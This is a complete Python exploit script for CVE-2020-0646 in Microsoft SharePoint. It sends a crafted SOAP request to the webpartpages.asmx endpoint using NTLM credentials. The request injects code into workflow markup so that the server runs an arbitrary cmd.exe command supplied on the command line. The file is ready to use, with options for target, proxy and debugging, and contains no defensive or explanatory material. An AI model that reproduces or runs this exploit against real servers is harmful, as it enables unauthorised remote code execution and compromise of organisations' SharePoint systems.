#!/usr/bin/python
from sys import argv, exit
import argparse
import requests
from bs4 import BeautifulSoup
from pwn import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_ntlm import HttpNtlmAuth


context.log_level = 'info'


class Exploit:
    webparts_path = '/_vti_bin/webpartpages.asmx'

    def __init__(
            self,
            redirect=False,
            proxy_address='',
            username='',
            domain='',
            password='',
            target=''
    ):
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.username = '%s\\%s' % (domain, username)
        self.target = target
        self.password = password
        self.session = requests.session()
        self.redirect = redirect
        self.timeout = 0.5
        self.proxies = {
            'http': 'http://%s' % proxy_address,
            'https': 'http://%s' % proxy_address
        } \
            if proxy_address is not None \
               and proxy_address != '' else {}
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
            'SOAPAction': 'http://microsoft.com/sharepoint/webpartpages/ValidateWorkflowMarkupAndCreateSupportObjects',
            'MIME-Version': '1.0',
            'Accept': '*/*',
            'Accept-Language': 'en-us, en;q=0.1',
            'X-FORMS_BASED_AUTH_ACCEPTED': 'T',
            'Content-Type': 'text/xml',
            'X-Vermeer-Content-Type': 'text/xml; charset=utf-8',
            'Accept-encoding': 'gzip, deflate',
            'Connection': 'Keep-Alive',
            'Pragma': 'no-cache',
        }
        self.query_params = {}
        self.form_values = {}
        self.cookies = {}
        self.payload = """\
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<ValidateWorkflowMarkupAndCreateSupportObjects xmlns="http://microsoft.com/sharepoint/webpartpages">
<workflowMarkupText>
<![CDATA[
<SequentialWorkflowActivity x:Class="MyWorkflow" x:Name="foobar" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow">
  <CallExternalMethodActivity x:Name="foo" MethodName='test1' InterfaceType='System.String);}Object/**/test2=System.Diagnostics.Process.Start("cmd.exe","/c {COMMAND}");private/**/void/**/foobar(){//' />
</SequentialWorkflowActivity>
]]>
</workflowMarkupText>
<rulesText></rulesText>
<configBlob></configBlob>
<flag>2</flag>
</ValidateWorkflowMarkupAndCreateSupportObjects>
</soap:Body>
</soap:Envelope>"""

    def do_get(self, url, params=None, data=None):
        return self.session.get(
            url=url,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            data=data,
            params=params,
            auth=HttpNtlmAuth(self.username, self.password)
        )

    def do_post(self, url, data=None, params=None):
        return self.session.post(
            url=url,
            data=data,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            params=params,
            auth=HttpNtlmAuth(self.username, self.password)
        )

    def parse_page(self, content):
        soup = BeautifulSoup(content, 'lxml')
        for key, val in self.form_values.iteritems():
            try:
                for tag in soup.select('input[name=%s]' % key):
                    try:
                        self.form_values[key] = tag['value']
                    except Exception as error:
                        log.debug('error for key %s error %s' % (key, str(error)))
            except Exception as error:
                log.debug('error for selector %s error %s' % (key, str(error)))
        return self

    def debug(self):
        try:
            import http.client as http_client
        except ImportError:
            import httplib as http_client
        http_client.HTTPConnection.debuglevel = 1
        logging.basicConfig()
        logging.getLogger().setLevel(logging.DEBUG)
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(logging.DEBUG)
        requests_log.propagate = True
        return self

    def get_form(self):
        url = '%s%s' % (self.target, self.webparts_path)
        resp = self.do_get(url=url, params=self.query_params)
        self.parse_page(content=resp.content)
        return self

    def send_payload(self, command):
        payload = self.payload
        while '  ' in payload:
            payload = payload.replace('  ', ' ')
        payload = payload.replace('\n', '')
        payload = payload.replace('{COMMAND}', command)
        url = '%s%s' % (self.target, self.webparts_path)
        resp = self.do_post(url=url, params=self.query_params, data=payload)
        return resp


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description='CVE-2020-0646 SharePoint exploit')
    try:
        parser.add_argument('-target', action='store', help='Target address: http(s)://target.com ')
        parser.add_argument('-username', action='store', help='Username to use: first.last')
        parser.add_argument('-domain', action='store', help='User domain to use: domain.local')
        parser.add_argument('-password', action='store', help='Password to use: Summer2020')
        parser.add_argument('-command', action='store', help='Command used in the payload')
        parser.add_argument('-debug', action='store', default=False, help='Enable debugging: False')
        parser.add_argument('-proxy', action='store', default='', help='Enable proxy: 10.10.10.10:8080')

        if len(argv) == 1:
            parser.print_help()
            exit(1)
        options = parser.parse_args()

        exp = Exploit(
            proxy_address=options.proxy,
            username=options.username,
            domain=options.domain,
            password=options.password,
            target=options.target
        )

        if options.debug:
            context.log_level = 'debug'
            exp.debug()
            log.debug('target %s payload %s username %s domain %s password %s debug %s proxy %s' % (
                options.target, options.command, options.username, options.domain, options.password, options.debug, options.proxy
            ))

        # exp.get_form()
        response = exp.send_payload(options.command)
        log.success(response.content)

    except Exception as error:
        log.debug('error in main %s' % str(error))
        parser.print_help()
